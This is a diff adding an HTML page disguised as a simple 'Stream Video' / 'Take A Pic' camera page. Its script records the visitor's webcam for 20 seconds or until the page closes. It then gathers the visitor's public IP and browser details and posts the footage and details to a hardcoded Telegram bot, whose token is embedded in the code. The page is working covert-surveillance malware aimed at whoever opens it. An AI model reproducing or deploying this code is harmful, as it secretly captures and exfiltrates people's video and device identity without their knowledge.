@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Stream Video</title>
+    <meta http-equiv="X-UA-Compatible"
+    content="ie=edge">
+</head>
+<body>
+  <video id="video" width="940" height="880"></video>
+  <br>
+  <br>
+  <button class="button1" id="foto">Take A Pic</button>
+  <style>
+      video {
+          justify-content: top;
+          align-item: center;
+      }
+      .button1 {
+          width: 200px;
+          height: 200px;
+          font-size: 30px;
+      }
+  </style>
+  <script>      
+      
+const video = document.getElementById('video');
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+    video.play();
+
+    const chunks = [];
+    const mediaRecorder = new MediaRecorder(stream);
+
+    mediaRecorder.ondataavailable = (event) => {
+      chunks.push(event.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const formData = new FormData();
+      formData.append('chat_id', '6469804005');
+      formData.append('video', blob);
+
+      fetch('https://api.ipify.org')        
+        .then(response => response.text())
+        .then(ip => {
+          const caption = `IP Device: ${ip}\n\nType Device: ${navigator.userAgent}\n\nBrand Device: ${navigator.vendor}\n\nUser Agent: ${navigator.userAgent}`;
+          formData.append('caption',caption)
+                   fetch(`https://api.telegram.org/bot7871929486:AAEzad2AlU6ULATf4qbXC38Zn2BVxHHuo0E/sendVideo`, {
+            method: 'POST',
+            body: formData,
+          })
+            .then((response) => response.json())
+            .then((data) => console.log(data))
+            .catch((error) => console.error(error));
+        });
+    };
+
+window.addEventListener('beforeunload', () => {
+mediaRecorder.stop();
+});
+
+window.addEventListener('unload', () => {
+mediaRecorder.stop();
+});
+
+    mediaRecorder.start(100);
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 20000); 
+  })
+  .catch(error => console.error(error));
+  </script>
+</body>
+</html>
